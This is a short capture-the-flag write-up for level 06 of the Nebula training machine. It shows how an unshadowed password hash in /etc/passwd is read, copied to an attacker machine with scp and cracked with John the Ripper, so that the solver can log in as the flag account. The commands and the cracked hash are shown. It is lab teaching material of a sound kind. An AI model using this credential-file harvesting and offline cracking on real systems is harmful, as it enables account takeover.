# Nebula - Level 06

### About ###

>The flag06 account credentials came from a legacy unix system.
>
>To do this level, log in as the level06 account with the password level06. Files for this level can be found in /home/flag06.

### Solution ###

Since the exercise deals with credentials, the `/etc/passwd` file is a possible lead.

```
level06@nebula:~$ cat /etc/passwd | grep flag06
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
```

`flag06`â€™s password is unshadowed, like the exercise suggested. The file is transfered to another machine in order to decrypt the password with  `john the ripper`.

```
root@kali:~# scp level06@nebula:/etc/passwd .

```

`john the ripper` finds the password hello. It is now possible to connect to the account `flag06` and execute `getflag`.

```
level06@nebula:~$ su flag06
Password:
sh-4.2$ getflag
You have successfully executed getflag on a target account
```
